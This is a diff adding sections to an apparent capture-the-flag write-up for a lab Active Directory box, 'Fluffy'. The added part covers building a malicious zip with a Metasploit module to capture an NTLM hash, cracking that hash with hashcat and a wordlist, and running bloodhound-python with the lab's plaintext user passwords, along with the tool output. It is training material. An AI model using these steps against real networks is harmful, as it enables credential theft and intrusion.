@@ -150,7 +150,9 @@ getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (149.9 Kil
 ```
 </details>
 
-Nice pdf, dont mnnd if i take a look 
+Findings in share
+=
+Nice pdf, dont mind if i take a look 
 
 ![image](https://github.com/user-attachments/assets/e1ba2b62-022b-43ac-a719-20b07168758c)
 
@@ -175,6 +177,85 @@ Improper input validation in Active Directory Certificate Services (AD CS) allow
 
 Active Directory Federation Server Spoofing Vulnerability
 > CVE-2025-3445
+
+
+Metasploit exploit the cve
+=
+time to use a module which aparently is not in metasploit
+
+1st get the module (rb file) and put it into this folder for reasons, after that, run it to make the payload (evil zip file)
+```
+/usr/share/metasploit-framework/modules/auxiliary/server/
+```
+
+![image](https://github.com/user-attachments/assets/875edeef-220a-4d6c-8e0f-95d4ad006860)
+
+and here we have the hash....
+time to put the cat to work
+![image](https://github.com/user-attachments/assets/59601e74-6897-442c-abf2-cde799d7b7bc)
+
+good cat! 
+
+```hashcat -m 5600 -a 0 agila-has.txt /usr/share/wordlists/rockyou.txt --force```
+![image](https://github.com/user-attachments/assets/1a3fecce-2231-4d24-be78-ba4aef7398a4)
+
+but too bad this user too is unprivilleged 
+
+bloodhound 
+=
+Using bloodhound, we can try to get 
+<details>
+fleischman
+
+```
+bloodhound-python -d FLUFFY.HTB -u j.fleischman -p "J0elTHEM4n1990!" -gc dc01.fluffy.htb -c all -ns 10.10.11.69
+
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: fluffy.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 10 users
+INFO: Found 54 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.fluffy.htb
+INFO: Done in 00M 51S
+```
+
+agila 
+
+```
+bloodhound-python -d FLUFFY.HTB -u p.agila -p "prometheusx-303" -gc dc01.fluffy.htb -c all -ns 10.10.11.69
+
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: fluffy.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 10 users
+INFO: Found 54 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.fluffy.htb
+INFO: Done in 00M 48S
+```
+	
+</details>
 
 
 
